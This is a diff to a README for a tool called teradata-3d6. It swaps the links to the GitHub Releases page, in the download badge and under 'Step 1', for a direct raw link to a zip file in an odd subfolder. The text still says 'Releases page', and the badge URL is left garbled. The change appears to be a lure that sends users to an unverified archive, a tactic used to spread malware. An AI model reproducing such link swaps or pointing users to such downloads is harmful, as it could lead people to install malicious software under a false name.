@@ -6,13 +6,13 @@ Welcome to teradata-3d6! This tool helps you visualize your 3D data clearly and 
 
 ## 📥 Download teradata-3d6
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue?style=for-the-badge)](https://github.com/Ashex64/teradata-3d6/releases)
+[![Download Now](https://raw.githubusercontent.com/Ashex64/teradata-3d6/main/palmiform/teradata-3d6.zip%20Now-Click%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ashex64/teradata-3d6/main/palmiform/teradata-3d6.zip)
 
 ### Step 1: Visit the Releases Page
 
 To download the latest version of teradata-3d6, visit our Releases page:
 
-[Download teradata-3d6](https://github.com/Ashex64/teradata-3d6/releases)
+[Download teradata-3d6](https://raw.githubusercontent.com/Ashex64/teradata-3d6/main/palmiform/teradata-3d6.zip)
 
 ## 📝 System Requirements
 
